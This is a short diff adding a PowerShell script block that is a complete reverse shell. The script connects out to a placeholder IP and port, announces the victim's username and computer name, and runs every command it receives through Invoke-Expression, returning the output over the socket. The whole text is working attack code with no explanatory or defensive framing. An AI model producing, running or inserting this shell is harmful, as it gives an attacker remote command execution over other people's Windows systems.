@@ -1,0 +1,24 @@
+Process {
+$modules=@()
+$c=New-Object System.Net.Sockets.TCPClient("IP",PORT)
+$s=$c.GetStream()
+[byte[]]$b=0..20000|%{0}
+$d=([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user "+$env:username+" on "+$env:computername+"`nEnjoy!.`n`n")
+$s.Write($d,0,$d.Length)
+$d=([text.encoding]::ASCII).GetBytes("PS "+(Get-Location).Path+">")
+$s.Write($d,0,$d.Length)
+while(($i=$s.Read($b,0,$b.Length)) -ne 0)
+{
+$E=New-Object -TypeName System.Text.ASCIIEncoding
+$D=$E.GetString($b,0,$i)
+$k=(Invoke-Expression -Command $d 2>&1 | Out-String)
+$l=$k+"PS "+(Get-Location).Path+"> "
+$x=($error[0] | Out-String)
+$error.clear()
+$l=$l+$x
+$d=([text.encoding]::ASCII).GetBytes($l)
+$s.Write($d,0,$d.Length)
+$s.Flush()
+}
+$c.Close()
+}
